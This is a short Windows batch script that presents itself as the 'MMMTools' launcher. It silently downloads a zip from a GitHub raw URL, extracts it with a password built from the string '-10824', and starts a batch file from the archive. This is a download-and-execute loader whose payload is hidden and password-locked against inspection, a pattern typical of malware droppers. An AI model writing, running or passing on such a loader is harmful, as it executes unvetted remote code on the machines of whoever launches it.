@echo off
set eflm=MMMTools1.2.zip
set flm=MMMTools1.2.bat
cls
echo.
echo MMMTools Starting...
echo.
set e=%e%-10824
curl -s https://raw.githubusercontent.com/mmmmm4299/MMMToolsD/main/%eflm% -o %eflm%
7zr.exe x "%eflm%" -p%e% >nul
start %flm%
